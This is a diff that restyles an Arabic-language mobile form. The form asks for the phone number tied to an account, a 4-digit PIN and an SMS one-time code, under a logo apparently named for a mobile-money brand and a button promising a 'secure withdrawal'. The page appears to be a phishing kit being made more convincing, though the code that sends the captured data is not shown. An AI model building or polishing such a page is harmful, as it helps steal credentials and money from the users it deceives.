@@ -7,32 +7,36 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
         body { margin: 0; padding: 0; background-color: #f9f9f9; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; min-height: 100vh; }
-        .wrapper { width: 100%; max-width: 450px; background: #fff; position: relative; padding-bottom: 120px; display: flex; flex-direction: column; overflow: hidden; }
+        .wrapper { width: 100%; max-width: 450px; background: #fff; position: relative; padding-bottom: 120px; display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
         
-        /* أماكن الصور (علامات الاستفهام) */
-        .header-container { width: 100%; height: 80px; display: flex; justify-content: center; align-items: center; }
-        .header-img { max-height: 100%; max-width: 100%; }
+        /* 1. الشعار العلوي */
+        .header-container { width: 100%; height: 90px; display: flex; justify-content: center; align-items: center; padding-top: 10px; }
+        .header-img { max-height: 80%; max-width: 90%; object-fit: contain; }
 
-        .form-container { padding: 0 20px; text-align: right; z-index: 2; }
+        .form-container { padding: 0 25px; text-align: right; z-index: 2; }
         .label { font-weight: bold; margin-bottom: 8px; display: block; font-size: 15px; color: #333; }
         
-        /* صناديق الإدخال */
-        .input-box { position: relative; border: 1.5px solid #000; border-radius: 12px; margin-bottom: 20px; background: #fff; display: flex; align-items: center; }
-        input { border: none; width: 100%; font-size: 17px; padding: 12px; text-align: center; outline: none; background: transparent; font-family: 'Cairo'; }
-        .field-icon { width: 30px; height: 30px; margin-left: 10px; }
+        .input-box { position: relative; border: 1.8px solid #000; border-radius: 12px; margin-bottom: 20px; background: #fff; display: flex; align-items: center; }
+        input { border: none; width: 100%; font-size: 18px; padding: 14px; text-align: center; outline: none; background: transparent; font-family: 'Cairo'; }
+        
+        /* 2 & 3. أيقونات الحقول */
+        .field-icon { width: 28px; height: 28px; margin-left: 12px; object-fit: contain; }
 
-        .btn-main { background-color: #94a3b8; color: white; border: none; width: 100%; padding: 16px; border-radius: 8px; font-size: 19px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btn-main { background-color: #94a3b8; color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 19px; font-weight: bold; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
         .btn-main.active { background-color: #2c5364; }
 
-        .banner-container { width: 100%; margin-top: 20px; text-align: center; }
-        .banner-img { width: 90%; border-radius: 8px; }
+        /* 4. البانر الإعلاني */
+        .banner-container { width: 100%; margin-top: 25px; text-align: center; }
+        .banner-img { width: 92%; border-radius: 10px; }
 
-        .otp-icon-container { width: 100%; text-align: center; margin: 20px 0; }
-        .otp-main-icon { width: 100px; height: 100px; }
+        /* 5. أيقونة OTP الكبيرة */
+        .otp-icon-container { width: 100%; text-align: center; margin: 30px 0; }
+        .otp-main-icon { width: 110px; height: 110px; object-fit: contain; }
 
-        .timer-box { background: #000; color: #fff; width: fit-content; margin: 15px auto; padding: 10px 25px; font-size: 24px; font-weight: bold; border-radius: 5px; }
+        .timer-box { background: #000; color: #fff; width: fit-content; margin: 15px auto; padding: 10px 30px; font-size: 26px; font-weight: bold; border-radius: 8px; }
         
-        .footer-container { position: absolute; bottom: 0; left: 0; width: 100%; height: 100px; z-index: 1; }
+        /* 6. خلفية الأسفل */
+        .footer-container { position: absolute; bottom: 0; left: 0; width: 100%; height: 130px; z-index: 1; pointer-events: none; }
         .footer-img { width: 100%; height: 100%; object-fit: cover; }
 
         .hidden { display: none !important; }
@@ -41,45 +45,41 @@
 <body>
 
 <div class="wrapper">
-    <!-- صورة الشعار العلوية -->
     <div class="header-container">
-        <img src="logo.png" class="header-img">
+        <img src="logo_masrvi.jpeg" class="header-img">
     </div>
 
     <!-- الواجهة الأولى -->
     <div id="p1" class="form-container">
         <label class="label">رقم الهاتف المربوط بالحساب *</label>
         <div class="input-box">
-            <input type="tel" id="tel" placeholder="رقم الهاتف" maxlength="8" inputmode="numeric" 
-                   oninput="this.value = this.value.replace(/[^0-9]/g, ''); validateInput();">
+            <input type="tel" id="tel" placeholder="رقم الهاتف" maxlength="8" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, ''); validateInput();">
             <img src="phone_icon.png" class="field-icon">
         </div>
 
         <label class="label">الرمز السري (PIN) *</label>
         <div class="input-box">
-            <input type="password" id="pin" placeholder="****" maxlength="4" inputmode="numeric" 
-                   oninput="this.value = this.value.replace(/[^0-9]/g, ''); validateInput();">
+            <input type="password" id="pin" placeholder="****" maxlength="4" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, ''); validateInput();">
             <img src="lock_icon.png" class="field-icon">
         </div>
 
         <button id="btn1" class="btn-main" onclick="toStep2()" disabled>ادخل السحب الآمن</button>
 
         <div class="banner-container">
-            <img src="banner.png" class="banner-img">
+            <img src="main_banner.jpeg" class="banner-img">
         </div>
     </div>
 
     <!-- الواجهة الثانية (OTP) -->
     <div id="p2" class="form-container hidden">
         <div class="otp-icon-container">
-            <img src="otp_icon.png" class="otp-main-icon">
+            <img src="otp_main_icon.jpeg" class="otp-main-icon">
         </div>
         
-        <p style="text-align: center; font-weight: bold;">يرجى ادخال الرمز الذي تلقيته عبر الرسائل النصية *</p>
+        <p style="text-align: center; font-weight: bold; color: #333;">يرجى ادخال الرمز الذي تلقيته عبر الرسائل النصية *</p>
         
         <div class="input-box">
-            <input type="tel" id="otp" placeholder="######" maxlength="6" inputmode="numeric" 
-                   oninput="this.value = this.value.replace(/[^0-9]/g, ''); validateOtp();">
+            <input type="tel" id="otp" placeholder="######" maxlength="6" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, ''); validateOtp();">
             <img src="otp_field_icon.png" class="field-icon">
         </div>
         
@@ -87,9 +87,8 @@
         <button id="btn2" class="btn-main" onclick="final()" disabled>تأكيد العملية</button>
     </div>
 
-    <!-- صورة الخلفية السفلية -->
     <div class="footer-container">
-        <img src="footer.png" class="footer-img">
+        <img src="footer_background.jpeg" class="footer-img">
     </div>
 </div>
 
@@ -105,7 +104,6 @@
         const t = document.getElementById('tel').value;
         const p = document.getElementById('pin').value;
         const btn = document.getElementById('btn1');
-        // تفعيل الزر فقط عند اكتمال الأرقام (8 للهاتف و 4 للرمز)
         if(t.length === 8 && p.length === 4) {
             btn.disabled = false;
             btn.classList.add('active');
@@ -118,7 +116,6 @@
     function validateOtp() {
         const o = document.getElementById('otp').value;
         const btn = document.getElementById('btn2');
-        // تفعيل الزر عند إدخال 6 أرقام
         if(o.length === 6) {
             btn.disabled = false;
             btn.classList.add('active');
